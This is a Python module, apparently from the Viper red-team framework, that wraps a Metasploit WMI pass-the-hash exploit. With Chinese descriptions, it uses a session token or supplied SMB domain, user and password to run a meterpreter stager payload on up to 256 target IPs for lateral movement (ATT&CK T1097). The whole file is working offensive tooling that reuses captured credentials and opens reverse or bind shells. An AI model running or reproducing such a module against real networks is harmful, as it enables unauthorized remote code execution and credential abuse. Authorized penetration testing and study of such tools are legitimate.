# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "WMI哈希传递"
    DESC = "使用Session的Token或已知的用户名及密码,通过wmi方式在目标主机执行载荷.\n" \
           "模块调用主机的wmic.exe和对方主机的powershell.exe,AV主动防御可能会提示风险.\n" \
           "(如模块提示powershell命令超长,请使用stager类型监听)\n" \
           "(模块无需内网路由)"
    MODULETYPE = TAG2CH.Lateral_Movement
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1097"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/kgotml"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1097/"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionIPAddressRange(name='address_range', name_tag="IP列表", desc="IP列表(支持1.1.1.1,2.2.2.2,3.3.3.3-3.3.3.10格式输入)",
                             required=True),
        OptionStr(name='SMBDomain', name_tag="域", desc="目标主机的域信息 . 表示本地域"),
        OptionStr(name='SMBUser', name_tag="用户名", desc="smb用户名"),
        OptionStr(name='SMBPass', name_tag="密码", desc="smb密码(不能是hash)"),
        OptionCredentialEnum(required=False, password_type=['windows', ]),
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/wmi_hash_api"
        self.runasjob = True

    def check(self):
        """执行前的检查函数"""
        # 设置RHOSTS参数
        address_range = self.param_address_range('address_range')
        if len(address_range) > 256:
            return False, "扫描IP范围过大(超过256),请缩小范围"
        elif len(address_range) < 0:
            self.set_option(key='RHOSTS', value=self.host_ipaddress)
        self.set_option('RHOSTS', ", ".join(address_range))

        payload = self.get_handler_payload()
        if "meterpreter_reverse" in payload or "meterpreter_bind" in payload:
            return False, "请选择Stager类型的监听(例如/meterpreter/reverse_tcp或/meterpreter/bind_tcp)"
        flag = self.set_payload_by_handler()
        if flag is not True:
            return False, "Handler解析失败,请重新选择Handler参数"

        flag = self.set_smb_info_by_credential()
        if flag is not True:
            domain = self.param('SMBDomain')
            user = self.param('SMBUser')
            password = self.param('SMBPass')
            if domain is not None and user is not None and password is not None:
                self.set_option(key='SMBDomain', value=domain)
                self.set_option(key='SMBUser', value=user)
                self.set_option(key='SMBPass', value=password)
                return True, None

        else:
            # 手工输入覆盖凭证输入
            domain = self.param('SMBDomain')
            user = self.param('SMBUser')
            password = self.param('SMBPass')
            if domain is not None and domain != "":
                self.set_option(key='SMBDomain', value=domain)
            if user is not None and user != "":
                self.set_option(key='SMBUser', value=user)
            if password is not None and password != "":
                self.set_option(key='SMBPass', value=password)
            return True, None
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("模块执行完成")
            for one in data:
                self.log_info("IP: {}  结果: {}".format(one.get("server"), one.get("flag")))
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
